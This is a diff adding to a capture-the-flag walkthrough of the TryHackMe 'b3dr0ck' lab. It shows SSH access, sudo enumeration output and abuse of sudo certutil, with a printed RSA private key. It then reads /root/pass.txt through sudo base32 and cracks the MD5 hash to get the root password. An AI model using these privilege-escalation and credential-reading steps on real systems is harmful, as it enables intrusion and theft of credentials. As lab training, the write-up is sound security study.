@@ -229,4 +229,126 @@ Welcome: 'Barney Rubble' is authorized.
 b3dr0ck> password
 Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
 
+
+┌──(duke㉿kali)-[~/Documents/THM_B3dr0ck]
+└─$ ssh barney@10.10.117.163
+barney@10.10.117.163's password: 
+barney@b3dr0ck:~$ ls
+barney.txt
+barney@b3dr0ck:~$ cat barney.txt 
+THM{f05780f08f0eb1de65023069d0e4c90c}
+barney@b3dr0ck:~$ 
+barney@b3dr0ck:~$ 
+barney@b3dr0ck:~$ ls
+barney.txt
+barney@b3dr0ck:~$ cd ..
+barney@b3dr0ck:/home$ ls -la
+total 16
+drwxr-xr-x  4 root   root   4096 Apr 10  2022 .
+drwxr-xr-x 19 root   root   4096 Apr  9  2022 ..
+drwxr-xr-x  3 barney barney 4096 Apr 30  2022 barney
+drwxr-xr-x  4 fred   fred   4096 Apr 30  2022 fred
+
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
+Matching Defaults entries for barney on b3dr0ck:                                                                    
+    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User barney may run the following commands on b3dr0ck:
+    (ALL : ALL) /usr/bin/certutil
+Sudoers file: /etc/sudoers.d/barney is readable
+barney ALL=(ALL:ALL) /usr/bin/certutil
+Sudoers file: /etc/sudoers.d/fred is readable
+fred ALL=(ALL:ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
+fred ALL=(ALL:ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
+
+
+barney@b3dr0ck:/home$ sudo -l
+
+
+### Get Fred Certs
+barney@b3dr0ck:/tmp$ sudo /usr/bin/certutil -a -fred.csr.pem
+Generating credentials for user: a (fredcsrpem)
+Generated: clientKey for a: /usr/share/abc/certs/a.clientKey.pem
+Generated: certificate for a: /usr/share/abc/certs/a.certificate.pem
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA27fu5AClefsHts5Jqb7TZYWh1wMw02YIjNYO4QKM2kINuXbe
+GVqNuj1JrMQvATgwXD/vyKZoXDF6zr+f0XkQ6CdJPmPURMB9Av3AfQLX6o1Q9JQa
+qHvYG0oDUIokO+Sbmlcs3pN/a5J08WQWTI1p/nlziHcWTRcSYL6rUkKijI1J0uro
+pLPRzvtz/5cySaVpeFsxBadtheeeaqoGYPo21x7UhRv1/x7qPWZv5QR7fQxOyJLl
+3YJBSQHlHrCDbxIYy6h2YU+zqBc5l6ZBYhLztPjAqQrG3tHwu2ZfNdoXYUo+oSM4
+MaWX3K3dIYcuBo3e1fhWwO7QHYk3Au9zPn5hpwIDAQABAoIBAQCcNd8QFy2O1dyc
+KXnRxywAp8tyVIBoK8i0aJPXgbqmigO78jjhibHt0RkKTcilc09eps5Rt43Gzh7j
+0vVLNmnAw/2c79jAsKGweLxbpKPhzGrcGFgDpVj1vd8xaaVtN5ExX/00mWUkE9I0
+tNXtwzSyiaKMSS5/zIFyatze9SUgCxmZHUL9GO4//QfJPtJKEwmzezjLWFtmw3Kq
+xws6jAJDnNFdgbOr50+NnE7GZ0I0iiyI/hMoMztAr2anmVHBn8xNX5UK2LIB8puQ
+/lhGi8ArFwbJGSBU+O053QzeGE8lxUDUYDsqKxC+Yk2Deq0yInhVlMdZ1cWYlA1l
+7S3SwRAxAoGBAP0TMagEs5MgOrd1IkbTcqF5KZGJPRI36FQSHSNJH8VTUCpIIICo
+8+dEaxkcM4JREZJLhuqkhO4BM8UhIrjmTDatPmmVqlXQiMb2VNroG4MjF1ALJp81
++IDHNPkYSt319u3kV9dceQM7LOZA9GuEn2gLo+vmxXVhIW4DdNTaOWyDAoGBAN5C
+CwGxEQzHU8Ouj8zgLO/C8xjAnXAy33Lhokrv5zUoKvw+cBhgLyVzFlMh4NOR83S6
+FbSTZq+6P0nfjihFtl4sSE1I7YBrXvJt1k+J2EiF4rRLY8dpEKG0pQybho75vuaf
+iYEl1vmQSjsjpXKVXG9LvyTaEUVLnvg/sV1wVHUNAoGAA6ctRlGbDfqfHlrQfdk7
+hF0tXm5utT6dWelRBltd3AlR1OppnbHSo3n3Wctwauckq8nvTp/FU3Is/yF1UNny
+K6/ggMGqTcbO0qBnpSlIjGILShp/Gjk7NxCpERdqrT2JrPFo2zD4hjVqdoBlhs/J
+RUU1vof8Pa+DPgVKwG/N+GUCgYAfUMrgOCSg2kzxG11jjoqGVb+O00TblC9rrmMB
+j//Ru5Ei7WE57gN2kVqp5/IXnU7iOX3pbYNgayuTqw4KmpfxeOfPC+F64KYGHne9
+yTxSK5sfsCek5ybSwfMnbZpt9r5xHDVxnvVFQJFU99bN6EGX5OJPvPIGA3uomsDQ
+24zq2QKBgArksoEHX5H5gFJ/UKY2o47LGUYHWZgcsZsS1hN1jTOMKQJsMkUmafD8
+p7lfnCd99rrgjnqNCsAgR5u/9g2keXzyI5GuD/1/UXqDMH4q9Zljo4wlimGKg9dY
+2vkAFwAtsbK8wx8Q+bv8SWVmZ0n9fajuq4jb1F8sx4+J0mnxE8s/
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIICnjCCAYYCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
+dDAeFw0yNDA2MTAwODE5MzZaFw0yNDA2MTEwODE5MzZaMBUxEzARBgNVBAMMCmZy
+ZWRjc3JwZW0wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDbt+7kAKV5
++we2zkmpvtNlhaHXAzDTZgiM1g7hAozaQg25dt4ZWo26PUmsxC8BODBcP+/Ipmhc
+MXrOv5/ReRDoJ0k+Y9REwH0C/cB9AtfqjVD0lBqoe9gbSgNQiiQ75JuaVyzek39r
+knTxZBZMjWn+eXOIdxZNFxJgvqtSQqKMjUnS6uiks9HO+3P/lzJJpWl4WzEFp22F
+555qqgZg+jbXHtSFG/X/Huo9Zm/lBHt9DE7IkuXdgkFJAeUesINvEhjLqHZhT7Oo
+FzmXpkFiEvO0+MCpCsbe0fC7Zl812hdhSj6hIzgxpZfcrd0hhy4Gjd7V+FbA7tAd
+iTcC73M+fmGnAgMBAAEwDQYJKoZIhvcNAQELBQADggEBACGKAI7c+yHEAq/EZ07I
+NRkf4F5agDamblS9VJt7WX7YuWJYvoLmGZgyzvI7cSvcAZvYuQwU6CuvsrTmIuxm
+y838rSQyNxRZkI1csliUHZ7Pl5A789lRuz3FTLabJhAHauk5bzEwigzNJicrFxtA
+SoQbeBw4mbYdyaDtV3yUf7zfJkxiOMYxk/ExKwzON2lS7sZHR40BgqY2C8bZKFaM
+eEYs44hpsAytBV/E5lJvzlzQSYhyxEQDeLo1bwKLXnPw0mRxatpPRo8gpdeye+Si
+D3HoFlW0RmJSzA+rJ/9Q4py3uWt1dBMIRRD5slE4LZNYHTEtIEq9CzA5X4Pj7pJv
+aWs=
+-----END CERTIFICATE-----
+
+### Get Fred Password
+
+                                                                                                                    
+┌──(duke㉿kali)-[~/Documents/THM_B3dr0ck]
+└─$ socat stdio ssl:10.10.117.163:54321,cert=fred.crt,key=fred.id,verify=0 
+
+
+ __     __   _     _             _____        _     _             _____        _ 
+ \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
+  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
+   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
+    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
+    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
+                                                                                 
+                                                                                 
+
+Welcome: 'fredcsrpem' is authorized.
+b3dr0ck> password
+Password hint: YabbaDabbaD0000! (user = 'fredcsrpem')
+b3dr0ck> 
+
+fred@b3dr0ck:/tmp$ sudo /usr/bin/base32 /root/pass.txt > root32.txt
+fred@b3dr0ck:/tmp$ /usr/bin/base32 -d root32.txt
+LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
+>> base32
+a00a12aad6b7c16bf07032bd05a31d56
+>> crackstation
+>>
+>> Hash	Type	Result
+a00a12aad6b7c16bf07032bd05a31d56	md5	flintstonesvitamins
+
+
+## flintstonesvitamins
+
 </code>
